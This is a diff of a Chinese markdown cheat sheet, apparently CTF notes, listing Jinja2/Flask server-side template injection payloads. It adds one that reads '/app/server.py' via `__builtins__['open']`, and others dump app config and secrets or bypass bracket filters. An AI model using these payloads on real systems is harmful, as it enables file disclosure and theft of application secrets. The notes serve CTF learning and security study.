@@ -91,8 +91,15 @@ python .\flask_session_cookie_hack.py decode -c eyJuMWNvZGUiOm51bGx9.X92dcQ.uupV
   `{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}`
 
 ## SSTI常用命令
-- {{config.items()}} *获取配置*
-- {{self.__dict__}} *自身dict*
-- {{get_flashed_messages.__globals__['current_app'].config}} *获取当前app配置*
-- {{get_flashed_messages.__globals__.__getitem__('current_app').config}} *__getitem__绕过[]*
-- {{url_for.__globals__.__getitem__('current_app').config}} *url_for减少字符长度*
+- **读取文件内容，()也可以为''**  
+```{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['open']("/app/server.py").read()}}``` 
+- **获取配置**  
+```{{config.items()}}```
+- **自身dict**  
+```{{self.__dict__}}```
+- **获取当前app配置**  
+```{{get_flashed_messages.__globals__['current_app'].config}}```
+- **__getitem__绕过[]**  
+```{{get_flashed_messages.__globals__.__getitem__('current_app').config}}```
+- **url_for减少字符长度**  
+```{{url_for.__globals__.__getitem__('current_app').config}} ```
